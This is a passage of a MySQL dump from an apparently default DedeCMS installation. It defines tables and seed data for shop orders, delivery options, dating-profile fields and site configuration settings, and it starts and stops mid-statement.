(7, '少校', 6, 5000, 1),
(8, '中校', 7, 6000, 1),
(9, '上校', 8, 9000, 1),
(10, '少将', 9, 14000, 1),
(11, '中将', 10, 19000, 1),
(12, '上将', 11, 24000, 1),
(15, '大将', 12, 29000, 1);

-- --------------------------------------------------------

--
-- 表的结构 `dede_search_cache`
--

CREATE TABLE IF NOT EXISTS `dede_search_cache` (
  `hash` char(32) NOT NULL,
  `lasttime` int(10) unsigned NOT NULL DEFAULT '0',
  `rsnum` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `ids` mediumtext,
  PRIMARY KEY (`hash`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk;

-- --------------------------------------------------------

--
-- 表的结构 `dede_search_keywords`
--

CREATE TABLE IF NOT EXISTS `dede_search_keywords` (
  `aid` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `keyword` char(30) NOT NULL DEFAULT '',
  `spwords` char(50) NOT NULL DEFAULT '',
  `count` mediumint(8) unsigned NOT NULL DEFAULT '1',
  `result` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `lasttime` int(10) unsigned NOT NULL DEFAULT '0',
  `channelid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `typeid` smallint(5) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`aid`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- 表的结构 `dede_sgpage`
--

CREATE TABLE IF NOT EXISTS `dede_sgpage` (
  `aid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(60) NOT NULL DEFAULT '',
  `ismake` smallint(6) NOT NULL DEFAULT '1',
  `filename` varchar(60) NOT NULL DEFAULT '',
  `keywords` varchar(30) NOT NULL DEFAULT '',
  `template` varchar(30) NOT NULL DEFAULT '',
  `likeid` varchar(20) NOT NULL DEFAULT '',
  `description` varchar(250) NOT NULL DEFAULT '',
  `uptime` int(10) unsigned NOT NULL DEFAULT '0',
  `body` mediumtext,
  PRIMARY KEY (`aid`),
  KEY `ismake` (`ismake`,`uptime`),
  KEY `likeid` (`likeid`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- 表的结构 `dede_shops_delivery`
--

CREATE TABLE IF NOT EXISTS `dede_shops_delivery` (
  `pid` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `dname` char(80) NOT NULL,
  `price` float(13,2) NOT NULL DEFAULT '0.00',
  `des` char(255) DEFAULT NULL,
  `orders` int(10) NOT NULL DEFAULT '0',
  PRIMARY KEY (`pid`),
  KEY `orders` (`orders`)
) ENGINE=MyISAM  DEFAULT CHARSET=gbk AUTO_INCREMENT=5 ;

--
-- 转存表中的数据 `dede_shops_delivery`
--

INSERT INTO `dede_shops_delivery` (`pid`, `dname`, `price`, `des`, `orders`) VALUES
(1, '送货上门', 10.21, '送货上门,领取商品时付费.', 0),
(2, '特快专递（EMS）', 25.00, '特快专递（EMS）,要另收手续费.', 0),
(3, '普通邮递', 5.00, '普通邮递', 0),
(4, '邮局快邮', 12.00, '邮局快邮', 0);

-- --------------------------------------------------------

--
-- 表的结构 `dede_shops_orders`
--

CREATE TABLE IF NOT EXISTS `dede_shops_orders` (
  `oid` varchar(80) NOT NULL,
  `userid` int(10) NOT NULL,
  `pid` int(10) NOT NULL DEFAULT '0',
  `paytype` tinyint(2) NOT NULL DEFAULT '1',
  `cartcount` int(10) NOT NULL DEFAULT '0',
  `dprice` float(13,2) NOT NULL DEFAULT '0.00',
  `price` float(13,2) NOT NULL DEFAULT '0.00',
  `priceCount` float(13,2) NOT NULL,
  `state` tinyint(1) NOT NULL DEFAULT '0',
  `ip` char(15) NOT NULL DEFAULT '',
  `stime` int(10) NOT NULL DEFAULT '0',
  KEY `stime` (`stime`),
  KEY `userid` (`userid`),
  KEY `oid` (`oid`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk;

-- --------------------------------------------------------

--
-- 表的结构 `dede_shops_products`
--

CREATE TABLE IF NOT EXISTS `dede_shops_products` (
  `aid` mediumint(8) NOT NULL DEFAULT '0',
  `oid` varchar(80) NOT NULL DEFAULT '',
  `userid` int(10) NOT NULL,
  `title` varchar(80) NOT NULL DEFAULT '',
  `price` float(13,2) NOT NULL DEFAULT '0.00',
  `buynum` int(10) NOT NULL DEFAULT '9',
  KEY `oid` (`oid`),
  KEY `userid` (`userid`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk;

-- --------------------------------------------------------

--
-- 表的结构 `dede_shops_userinfo`
--

CREATE TABLE IF NOT EXISTS `dede_shops_userinfo` (
  `userid` int(10) NOT NULL,
  `oid` varchar(80) NOT NULL DEFAULT '',
  `consignee` char(15) NOT NULL DEFAULT '',
  `address` varchar(255) NOT NULL DEFAULT '',
  `zip` int(10) NOT NULL DEFAULT '0',
  `tel` varchar(255) NOT NULL DEFAULT '',
  `email` varchar(255) NOT NULL DEFAULT '',
  `des` varchar(255) NOT NULL DEFAULT '',
  KEY `oid` (`oid`),
  KEY `userid` (`userid`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk;

-- --------------------------------------------------------

--
-- 表的结构 `dede_softconfig`
--

CREATE TABLE IF NOT EXISTS `dede_softconfig` (
  `downtype` smallint(6) NOT NULL DEFAULT '0',
  `ismoresite` smallint(6) NOT NULL DEFAULT '0',
  `gotojump` smallint(6) NOT NULL DEFAULT '0',
  `islocal` smallint(5) unsigned NOT NULL DEFAULT '1',
  `sites` text,
  `downmsg` text,
  `moresitedo` smallint(5) unsigned NOT NULL DEFAULT '1',
  `dfrank` smallint(5) unsigned NOT NULL DEFAULT '0',
  `dfywboy` smallint(5) unsigned NOT NULL DEFAULT '0',
  `argrange` smallint(5) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`downtype`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk;

--
-- 转存表中的数据 `dede_softconfig`
--

INSERT INTO `dede_softconfig` (`downtype`, `ismoresite`, `gotojump`, `islocal`, `sites`, `downmsg`, `moresitedo`, `dfrank`, `dfywboy`, `argrange`) VALUES
(0, 1, 1, 1, 'http://www.aaa.com | 镜像地址一\r\nhttp://www.bbb.com | 镜像地址二\r\nhttp://www.ccc.com | 镜像地址三\r\n', '<p>☉推荐使用第三方专业下载工具下载本站软件，使用 WinRAR v3.10 以上版本解压本站软件。<br />\r\n☉如果这个软件总是不能下载的请点击报告错误,谢谢合作!!<br />\r\n☉下载本站资源，如果服务器暂不能下载请过一段时间重试！<br />\r\n☉如果遇到什么问题，请到本站论坛去咨寻，我们将在那里提供更多 、更好的资源！<br />\r\n☉本站提供的一些商业软件是供学习研究之用，如用于商业用途，请购买正版。</p>', 0, 0, 0, 0);

-- --------------------------------------------------------

--
-- 表的结构 `dede_stepselect`
--

CREATE TABLE IF NOT EXISTS `dede_stepselect` (
  `id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `itemname` char(30) DEFAULT '',
  `egroup` char(20) DEFAULT '',
  `issign` tinyint(1) unsigned DEFAULT '0',
  `issystem` tinyint(1) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=gbk AUTO_INCREMENT=16 ;

--
-- 转存表中的数据 `dede_stepselect`
--

INSERT INTO `dede_stepselect` (`id`, `itemname`, `egroup`, `issign`, `issystem`) VALUES
(1, '血型', 'blood', 1, 1),
(2, '体型', 'bodytype', 1, 1),
(3, '公司规模', 'cosize', 1, 1),
(4, '交友', 'datingtype', 1, 1),
(5, '是否饮酒', 'drink', 1, 1),
(6, '教育程度', 'education', 1, 1),
(7, '住房', 'house', 1, 1),
(8, '收入', 'income', 1, 1),
(9, '婚姻', 'marital', 1, 1),
(10, '是否抽烟', 'smoke', 1, 1),
(11, '星座', 'star', 1, 1),
(12, '系统缓存标识', 'system', 1, 1),
(13, '行业', 'vocation', 0, 0),
(14, '地区', 'nativeplace', 0, 0),
(15, '信息类型', 'infotype', 0, 0);

-- --------------------------------------------------------

--
-- 表的结构 `dede_sysconfig`
--

CREATE TABLE IF NOT EXISTS `dede_sysconfig` (
  `aid` smallint(8) unsigned NOT NULL DEFAULT '0',
  `varname` varchar(20) NOT NULL DEFAULT '',
  `info` varchar(100) NOT NULL DEFAULT '',
  `groupid` smallint(6) NOT NULL DEFAULT '1',
  `type` varchar(10) NOT NULL DEFAULT 'string',
  `value` text,
  PRIMARY KEY (`varname`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk;

--
-- 转存表中的数据 `dede_sysconfig`
--

INSERT INTO `dede_sysconfig` (`aid`, `varname`, `info`, `groupid`, `type`, `value`) VALUES
(1, 'cfg_basehost', '站点根网址', 1, 'string', 'http://127.0.0.1'),
(2, 'cfg_cmspath', 'DedeCMS安装目录', 2, 'string', '/dede'),
(3, 'cfg_cookie_encode', 'cookie加密码', 2, 'string', 'VeBKi6138W'),
(4, 'cfg_indexurl', '网页主页链接', 1, 'string', '/dede'),
(5, 'cfg_backup_dir', '数据备份目录（在data目录内）', 2, 'string', 'backupdata'),
(6, 'cfg_indexname', '主页链接名', 1, 'string', '主页'),
(7, 'cfg_webname', '网站名称', 1, 'string', '我的网站'),
(8, 'cfg_adminemail', '网站发信EMAIL', 2, 'string', 'admin@ewbsite.com'),
(9, 'cfg_html_editor', 'Html编辑器选项（仅支持 dede 和 fck）', 2, 'string', 'fck'),
(10, 'cfg_arcdir', '文档HTML默认保存路径', 1, 'string', '/a'),
(11, 'cfg_medias_dir', '图片/上传文件默认路径', 1, 'string', '/uploads'),
(12, 'cfg_ddimg_width', '缩略图默认宽度', 3, 'number', '240'),
(13, 'cfg_ddimg_height', '缩略图默认高度', 3, 'number', '180'),
(63, 'cfg_album_width', '图集默认显示图片的大小', 3, 'number', '800'),
(15, 'cfg_imgtype', '图片浏览器文件类型', 3, 'string', 'jpg|gif|png'),
(16, 'cfg_softtype', '允许上传的软件类型', 3, 'bstring', 'zip|gz|rar|iso|doc|xsl|ppt|wps'),
(17, 'cfg_mediatype', '允许的多媒体文件类型', 3, 'bstring', 'swf|mpg|mp3|rm|rmvb|wmv|wma|wav|mid|mov'),
(18, 'cfg_specnote', '专题的最大节点数', 2, 'number', '6'),
(19, 'cfg_list_symbol', '栏目位置的间隔符号', 2, 'string', ' > '),
(20, 'cfg_notallowstr', '禁用词语（系统将直接停止用户动作）<br/>用|分开，但不要在结尾加|', 5, 'bstring', '非典|艾滋病|阳痿'),
(21, 'cfg_feedbackcheck', '评论及留言(是/否)需审核', 5, 'bool', 'N'),
(22, 'cfg_keyword_replace', '关键字替换(是/否)使用本功能会影响HTML生成速度', 2, 'bool', 'Y'),
(23, 'cfg_fck_xhtml', '编辑器(是/否)使用XHTML', 1, 'bool', 'N'),
(24, 'cfg_df_style', '模板默认风格', 1, 'string', 'default'),
(25, 'cfg_multi_site', '(是/否)支持多站点，开启此项后附件、栏目连接、arclist内容启用绝对网址', 2, 'bool', 'N'),
(58, 'cfg_rm_remote', '远程图片本地化', 7, 'bool', 'Y'),
(27, 'cfg_dede_log', '(是/否)开启管理日志', 2, 'bool', 'N'),
(28, 'cfg_powerby', '网站版权信息', 1, 'bstring', 'Copyright &copy; 2002-2009 DEDECMS. 织梦科技 版权所有'),
(722, 'cfg_jump_once', '跳转网址是否直接跳转？（否则显示中转页）', 7, 'bool', 'Y'),
(723, 'cfg_task_pwd', '系统计划任务客户端许可密码<br/>(需要客户端，通常不会太重要)', 7, 'string', ''),
(29, 'cfg_arcsptitle', '(是/否)开启分页标题，开启会影响HTML生成速度', 6, 'bool', 'N'),
(30, 'cfg_arcautosp', '(是/否)开启长文章自动分页', 6, 'bool', 'N'),
(31, 'cfg_arcautosp_size', '文章自动分页大小（单位: K）', 6, 'number', '5'),
(32, 'cfg_auot_description', '自动摘要长度（0-250，0表示不启用）', 7, 'number', '240'),
(33, 'cfg_ftp_host', 'FTP主机', 2, 'string', ''),
(34, 'cfg_ftp_port', 'FTP端口', 2, 'number', '21'),
(35, 'cfg_ftp_user', 'FTP用户名', 2, 'string', ''),
(36, 'cfg_ftp_pwd', 'FTP密码', 2, 'string', ''),
(37, 'cfg_ftp_root', '网站根在FTP中的目录', 2, 'string', '/'),
(38, 'cfg_ftp_mkdir', '是否强制用FTP创建目录', 2, 'bool', 'N'),
(39, 'cfg_feedback_ck', '评论加验证码重确认', 5, 'bool', 'Y'),
(40, 'cfg_list_son', '上级列表是否包含子类内容', 6, 'bool', 'Y'),
(41, 'cfg_mb_open', '是否开启会员功能', 4, 'bool', 'Y'),
(42, 'cfg_mb_album', '是否开启会员图集功能', 4, 'bool', 'Y'),
(43, 'cfg_mb_upload', '是否允许会员上传非图片附件', 4, 'bool', 'Y'),
(44, 'cfg_mb_upload_size', '会员上传文件大小(K)', 4, 'number', '1024'),
(45, 'cfg_mb_sendall', '是否开放会员对自定义模型投稿', 4, 'bool', 'Y'),
(46, 'cfg_mb_rmdown', '是否把会员指定的远程文档下载到本地', 4, 'bool', 'Y'),
(47, 'cfg_cli_time', '服务器时区设置', 2, 'number', '8'),
(48, 'cfg_mb_addontype', '会员附件许可的类型', 4, 'bstring', 'swf|mpg|mp3|rm|rmvb|wmv|wma|wav|mid|mov|zip|rar|doc|xsl|ppt|wps'),
(49, 'cfg_mb_max', '会员附件总大小限制(MB)', 4, 'number', '500'),
(20, 'cfg_replacestr', '替换词语（词语会被替换成***）<br/>用|分开，但不要在结尾加|', 5, 'bstring', '她妈|它妈|他妈|你妈|去死|贱人'),
(719, 'cfg_makeindex', '发布文章后马上更新网站主页', 6, 'bool', 'N'),
(51, 'cfg_keyword_like', '使用关键词关连文章', 6, 'bool', 'N'),
(52, 'cfg_index_max', '网站主页调用函数最大索引文档数<br>不适用于经常单栏目采集过多内容的网站<br>不启用本项此值设置为0即可', 6, 'number', '10000'),
(53, 'cfg_index_cache', 'arclist标签调用缓存<br />(0 不启用，大于0值为多少秒)', 6, 'number', '86400'),
(54, 'cfg_tplcache', '是否启用模板缓存', 6, 'bool', 'Y'),
(55, 'cfg_tplcache_dir', '模板缓存目录', 6, 'string', '/data/tplcache'),
(56, 'cfg_makesign_cache', '发布/修改单个文档是否使用调用缓存', 6, 'bool', 'N'),
(59, 'cfg_arc_dellink', '删除非站内链接', 7, 'bool', 'N'),
(60, 'cfg_arc_autopic', '提取第一张图片作为缩略图', 7, 'bool', 'Y'),
(61, 'cfg_arc_autokeyword', '自动提取关键字', 7, 'bool', 'Y'),
(62, 'cfg_title_maxlen', '文档标题最大长度<br>改此参数后需要手工修改数据表', 7, 'number', '60'),
(64, 'cfg_check_title', '发布文档时是否检测重复标题', 7, 'bool', 'Y'),
(65, 'cfg_album_row', '图集多行多列样式默认行数', 3, 'number', '3'),
(66, 'cfg_album_col', '图集多行多列样式默认列数', 3, 'number', '4'),
(67, 'cfg_album_pagesize', '图集多页多图每页显示最大数', 3, 'number', '12'),
(68, 'cfg_album_style', '图集默认样式<br />1为多页多图,2为多页单图,3为缩略图列表', 3, 'number', '2'),
(69, 'cfg_album_ddwidth', '图集默认缩略图大小', 3, 'number', '200'),
(70, 'cfg_mb_notallow', '不允许注册的会员id', 4, 'bstring', 'www,bbs,ftp,mail,user,users,admin,administrator'),
(71, 'cfg_mb_idmin', '用户id最小长度', 4, 'number', '3'),
(72, 'cfg_mb_pwdmin', '用户密码最小长度', 4, 'number', '3'),
(73, 'cfg_md_idurl', '是否严格限定会员登录id<br>允许会员使用二级域名必须设置此项', 4, 'bool', 'N'),
(74, 'cfg_mb_rank', '注册会员默认级别<br>[会员权限管理中]查看级别代表的数字', 4, 'number', '10'),
(76, 'cfg_feedback_time', '两次评论至少间隔时间(秒钟)', 5, 'number', '30'),
(77, 'cfg_feedback_numip', '每个IP一小时内最大评论数', 5, 'number', '30'),
(78, 'cfg_md_mailtest', '是否限制Email只能注册一个帐号', 4, 'bool', 'N'),
(79, 'cfg_mb_spacesta', '会员使用权限开通状态<br>(-10 邮件验证 -1 手工审核, 0 没限制)', 4, 'number', '0'),
(728, 'cfg_mb_allowreg', '是否允许新会员注册', 4, 'bool', 'Y'),
(729, 'cfg_mb_adminlock', '是否禁止访问管理员帐号的空间', 4, 'bool', 'N'),
(81, 'cfg_vdcode_member', '会员投稿是否使用验证码', 5, 'bool', 'Y'),
(83, 'cfg_mb_cktitle', '会员投稿是否检测重复标题', 5, 'bool', 'Y'),
(84, 'cfg_mb_editday', '投稿多长时间后不能再修改[天]', 5, 'number', '7'),
(729, 'cfg_sendarc_scores', '投稿可获取积分', 5, 'number', '10'),
(88, 'cfg_caicai_sub', '被踩扣除文章好评度', 5, 'number', '2'),
(89, 'cfg_caicai_add', '被顶扣除文章好评度', 5, 'number', '2'),
(90, 'cfg_feedback_add', '详细好评可获好评度', 5, 'number', '5'),
(91, 'cfg_feedback_sub', '详细恶评扣除好评度', 5, 'number', '5'),
(730, 'cfg_sendfb_scores', '参与评论可获积分', 5, 'number', '3'),
(92, 'cfg_search_max', '最大搜索检查文档数', 6, 'number', '50000'),
(93, 'cfg_search_maxrc', '最大返回搜索结果数', 6, 'number', '300'),
(94, 'cfg_search_time', '搜索间隔时间(秒/对网站所有用户)', 6, 'number', '3'),
(95, 'cfg_baidunews_limit', '百度新闻xml更新新闻数量 最大100', 8, 'string', '100'),
(223, 'cfg_smtp_port', 'smtp服务器端口', 2, 'string', '25'),
(221, 'cfg_sendmail_bysmtp', '是否启用smtp方式发送邮件', 2, 'bool', 'Y'),
(222, 'cfg_smtp_server', 'smtp服务器', 2, 'string', 'smtp.qq.com'),
(224, 'cfg_smtp_usermail', 'SMTP服务器的用户邮箱', 2, 'string', ''),
(225, 'cfg_smtp_user', 'SMTP服务器的用户帐号', 2, 'string', ''),
(226, 'cfg_smtp_password', 'SMTP服务器的用户密码', 2, 'string', ''),
(96, 'cfg_updateperi', '百度新闻xml更新时间 （单位：分钟）', 8, 'string', '15'),
(227, 'cfg_online_type', '在线支付网关类型', 2, 'string', 'nps'),
(706, 'cfg_upload_switch', '删除文章文件同时删除相关附件文件', 2, 'bool', 'Y'),
(708, 'cfg_rewrite', '是否使用伪静态', 2, 'bool', 'N'),
(707, 'cfg_allsearch_limit', '网站全局搜索时间限制', 2, 'string', '1'),
(709, 'cfg_delete', '文章回收站(是/否)开启', 2, 'bool', 'Y'),
(710, 'cfg_keywords', '站点默认关键字', 1, 'string', ''),
(711, 'cfg_description', '站点描述', 1, 'bstring', ''),
(712, 'cfg_beian', '网站备案号', 1, 'string', ''),
(713, 'cfg_need_typeid2', '是否启用副栏目', 6, 'bool', 'Y'),
(72, 'cfg_mb_pwdtype', '前台密码验证类型：默认32 — 32位md5，可选：<br />l16 — 前16位， r16 — 后16位， m16 — 中间16位', 4, 'string', '32'),
(716, 'cfg_cache_type', 'id 文档ID，content 标签最终内容<br />(修改此变量后必须更新系统缓存)', 6, 'string', 'id'),
(717, 'cfg_max_face', '会员上传头像大小限制(单位：KB)', 3, 'number', '50'),
(718, 'cfg_typedir_df', '栏目网址使用目录名（不显示默认页，即是 /a/abc/ 形式）', 2, 'bool', 'Y'),
(719, 'cfg_make_andcat', '发表文章后马上更新相关栏目', 6, 'bool', 'N'),
(720, 'cfg_make_prenext', '发表文章后马上更新上下篇', 6, 'bool', 'Y'),
(721, 'cfg_feedback_forbid', '是否禁止所有评论(将包括禁止顶踩等)', 5, 'bool', 'N'),
(724, 'cfg_addon_domainbind', '附件目录是否绑定为指定的二级域名', 7, 'bool', 'N'),
(725, 'cfg_addon_domain', '附件目录的二级域名', 7, 'string', ''),
(726, 'cfg_df_dutyadmin', '默认责任编辑(dutyadmin)', 7, 'string', 'admin'),
(727, 'cfg_mb_allowncarc', '是否允许用户空间显示未审核文章', 4, 'bool', 'Y'),
(730, 'cfg_mb_spaceallarc', '会员空间中所有文档的频道ID(不限为0)', 4, 'number', '0'),
(731, 'cfg_face_adds', '上传头像增加积分', 5, 'number', '10'),
(732, 'cfg_moreinfo_adds', '填写详细资料增加积分', 5, 'number', '20'),
(733, 'cfg_money_scores', '多少积分可以兑换一个金币', 5, 'number', '50'),
(734, 'cfg_mb_wnameone', '是否允许用户笔名/昵称重复', 4, 'bool', 'N'),
(735, 'cfg_arc_dirname', '是否允许用目录作为文档文件名<br />文档命名规则需改为：{typedir}/{aid}/index.html', 7, 'bool', 'Y'),
(736, 'cfg_puccache_time', '需缓存内容全局缓存时间(秒)', 6, 'number', '36000'),
(737, 'cfg_arc_click', '文档默认点击数(-1表示随机50-200)', 7, 'number', '-1'),
(738, 'cfg_addon_savetype', '附件保存形式(按data函数日期参数)', 3, 'string', 'ymd'),
(739, 'cfg_qk_uploadlit', '异步上传缩略图(空间太不稳定的用户关闭此项)', 3, 'bool', 'Y'),
(740, 'cfg_login_adds', '登录会员中心获积分', 5, 'number', '2'),
(741, 'cfg_userad_adds', '会员推广获积分', 5, 'number', '10'),
(742, 'cfg_ddimg_full', '缩略图是否使用强制大小(对背景填充)', 3, 'bool', 'N'),
(743, 'cfg_ddimg_bgcolor', '缩略图空白背景填充颜色(0-白,1-黑)', 3, 'number', '0'),
(744, 'cfg_replace_num', '文档内容同一关键词替换次数(0为全部替换)', 7, 'number', '2'),
(745, 'cfg_uplitpic_cut', '上传缩略图后是否马上弹出裁剪框', 3, 'bool', 'Y'),
(746, 'cfg_album_mark', '图集是否使用水印(小图也会受影响)', 3, 'bool', 'N'),
(747, 'cfg_mb_feedcheck', '会员动态是否需要审核', 4, 'bool', 'N'),
(748, 'cfg_mb_msgischeck', '会员状态是否需要审核', 4, 'bool', 'N'),
(749, 'cfg_mb_reginfo', '注册是否需要完成详细资料的填写', 4, 'bool', 'Y'),
(750, 'cfg_remote_site', '是否启用远程站点', 2, 'bool', 'N'),
(751, 'cfg_title_site', '是否发布和编辑文档时远程发布(启用远程站点的前提下)', 2, 'bool', 'N');

-- --------------------------------------------------------

--
-- 表的结构 `dede_sys_enum`
--

CREATE TABLE IF NOT EXISTS `dede_sys_enum` (
  `id` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `ename` char(30) NOT NULL DEFAULT '',
  `evalue` smallint(6) NOT NULL DEFAULT '0',
  `egroup` char(20) NOT NULL DEFAULT '',
  `disorder` smallint(5) unsigned NOT NULL DEFAULT '0',
  `issign` tinyint(1) unsigned NOT NULL DEFAULT '1',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=gbk AUTO_INCREMENT=140 ;

--
-- 转存表中的数据 `dede_sys_enum`
--

INSERT INTO `dede_sys_enum` (`id`, `ename`, `evalue`, `egroup`, `disorder`, `issign`) VALUES
(139, 'cms制作', 503, 'vocation', 503, 0),
(39, '租房', 1, 'house', 0, 1),
(40, '一房以上', 2, 'house', 0, 1),
(41, '两房以上', 3, 'house', 0, 1),
(42, '大户/别墅', 4, 'house', 0, 1),
(43, '低于1000元', 1, 'income', 0, 1),
(44, '1000元以上', 2, 'income', 0, 1),
(45, '2000元以上', 3, 'income', 0, 1),
(46, '4000元以上', 4, 'income', 0, 1),
(47, '8000元以上', 5, 'income', 0, 1),
(48, '15000以上', 6, 'income', 0, 1),
(49, '初中以上', 1, 'education', 0, 1),
(50, '高中/中专', 2, 'education', 0, 1),
(51, '大学专科', 3, 'education', 0, 1),
(52, '大学本科', 4, 'education', 0, 1),
(53, '硕士', 5, 'education', 0, 1),
(54, '博士以上', 6, 'education', 0, 1),
(55, '仅用于判断缓存是否存在', 0, 'system', 0, 1),
(56, '白羊座', 1, 'star', 0, 1),
(57, '金牛座', 2, 'star', 0, 1),
(58, '双子座', 3, 'star', 0, 1),
(59, '巨蟹座', 4, 'star', 0, 1),
(60, '狮子座', 5, 'star', 0, 1),
(61, '处女座', 6, 'star', 0, 1),
(62, '天枰座', 7, 'star', 0, 1),
(63, '天蝎座', 8, 'star', 0, 1),
(64, '射手座', 9, 'star', 0, 1),
(65, '摩羯座', 10, 'star', 0, 1),
(66, '水瓶座', 11, 'star', 0, 1),
(67, '双鱼座', 12, 'star', 0, 1),
(68, '不吸烟', 1, 'smoke', 0, 1),
(69, '偶尔吸一点', 2, 'smoke', 0, 1),
(70, '抽得很凶', 3, 'smoke', 0, 1),
(71, '不喝酒', 1, 'drink', 0, 1),
(72, '偶尔喝一点', 2, 'drink', 0, 1),
(73, '喝得很凶', 3, 'drink', 0, 1),
(74, 'A', 1, 'blood', 0, 1),
(75, 'B', 2, 'blood', 0, 1),
(76, 'AB', 3, 'blood', 0, 1),
(77, 'O', 4, 'blood', 0, 1),
(78, '未婚', 1, 'marital', 0, 1),
(79, '已婚', 2, 'marital', 0, 1),
(80, '离异', 3, 'marital', 0, 1),
(81, '丧偶', 4, 'marital', 0, 1),
(82, '匀称', 1, 'bodytype', 0, 1),
(83, '苗条', 2, 'bodytype', 0, 1),
(84, '健壮', 3, 'bodytype', 0, 1),
(85, '略胖', 4, 'bodytype', 0, 1),
(86, '丰满', 5, 'bodytype', 0, 1),
(87, '瘦小', 6, 'bodytype', 0, 1),
(88, '高瘦', 7, 'bodytype', 0, 1),
(89, '网友', 1, 'datingtype', 0, 1),
(90, '恋人', 2, 'datingtype', 0, 1),
(91, '玩伴', 3, 'datingtype', 0, 1),
(92, '共同兴趣', 4, 'datingtype', 0, 1),
(93, '男性朋友', 5, 'datingtype', 0, 1),
(94, '女性朋友', 6, 'datingtype', 0, 1),
(95, '50人以下', 1, 'cosize', 0, 1),
(96, '50-200人', 2, 'cosize', 0, 1),
(97, '200-500人', 3, 'cosize', 0, 1),
(98, '500-2000人', 4, 'cosize', 0, 1),
(99, '2000-5000人', 5, 'cosize', 0, 1),
(100, '5000人以上', 6, 'cosize', 0, 1),
(101, '广州市', 500, 'nativeplace', 500, 0),
(102, '中山市', 1000, 'nativeplace', 1000, 0),
(103, '天河区', 501, 'nativeplace', 501, 0),
(104, '越秀区', 502, 'nativeplace', 502, 0),
(106, '海珠区', 503, 'nativeplace', 503, 0),
(107, '石岐区', 1001, 'nativeplace', 1001, 0),
(108, '西区', 1002, 'nativeplace', 1002, 0),
(109, '东区', 1003, 'nativeplace', 1003, 0),
(110, '小榄镇', 1004, 'nativeplace', 1004, 0),
(111, '商品', 500, 'infotype', 500, 0),
(112, '租房', 1000, 'infotype', 1000, 0),
(113, '交友', 1500, 'infotype', 1500, 0),
(114, '招聘', 2000, 'infotype', 2000, 0),
(115, '求职', 2500, 'infotype', 2500, 0),
(116, '票务', 3000, 'infotype', 3000, 0),
(117, '服务', 3500, 'infotype', 3500, 0),
(118, '培训', 4000, 'infotype', 4000, 0),
(119, '出售', 501, 'infotype', 501, 0),
(121, '求购', 502, 'infotype', 502, 0),
(122, '交换', 503, 'infotype', 503, 0),
(123, '合作', 504, 'infotype', 504, 0),
(124, '出租', 1001, 'infotype', 1001, 0),
(125, '求租', 1002, 'infotype', 1002, 0),
(126, '合租', 1003, 'infotype', 1003, 0),
(127, '找帅哥', 1501, 'infotype', 1501, 0),
(128, '找美女', 1502, 'infotype', 1502, 0),
(129, '纯友谊', 1503, 'infotype', 1503, 0),
(130, '玩伴', 1504, 'infotype', 1504, 0),
(131, '互联网', 500, 'vocation', 500, 0),
(132, '网站制作', 501, 'vocation', 501, 0),
(133, '机械', 1000, 'vocation', 1000, 0),
(134, '农业机械', 1001, 'vocation', 1001, 0),
(135, '机床', 1002, 'vocation', 1002, 0),
(136, '纺织设备和器材', 1003, 'vocation', 1003, 0),
(137, '风机/排风设备', 1004, 'vocation', 1004, 0),
(138, '虚心', 502, 'vocation', 502, 0);

-- --------------------------------------------------------

--
-- 表的结构 `dede_sys_module`
--

CREATE TABLE IF NOT EXISTS `dede_sys_module` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `hashcode` char(32) NOT NULL DEFAULT '',
  `modname` varchar(30) NOT NULL DEFAULT '',
  `indexname` varchar(20) NOT NULL DEFAULT '',
  `indexurl` varchar(30) NOT NULL DEFAULT '',
  `ismember` tinyint(4) NOT NULL DEFAULT '1',
  `menustring` text,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=gbk AUTO_INCREMENT=7 ;

--
-- 转存表中的数据 `dede_sys_module`
--

INSERT INTO `dede_sys_module` (`id`, `hashcode`, `modname`, `indexname`, `indexurl`, `ismember`, `menustring`) VALUES
(1, '0cce60bc0238aa03804682c801584991', '百度新闻', '', '', 0, ''),
(2, '1f35620fb42d452fa2bdc1dee1690f92', '文件管理器', '', '', 0, ''),
(3, '72ffa6fabe3c236f9238a2b281bc0f93', '广告管理', '', '', 0, ''),
(4, 'b437d85a7a7bc778c9c79b5ec36ab9aa', '友情链接', '', '', 0, ''),
(5, 'acb8b88eb4a6d4bfc375c18534f9439e', '投票模块', '', '', 0, ''),
(6, '572606600345b1a4bb8c810bbae434cc', '挑错管理', '', '', 0, '');

-- --------------------------------------------------------

--
-- 表的结构 `dede_sys_set`
--

CREATE TABLE IF NOT EXISTS `dede_sys_set` (
  `id` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `sname` char(20) NOT NULL DEFAULT '',
  `items` text,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=gbk AUTO_INCREMENT=3 ;

--
-- 转存表中的数据 `dede_sys_set`
--

INSERT INTO `dede_sys_set` (`id`, `sname`, `items`) VALUES
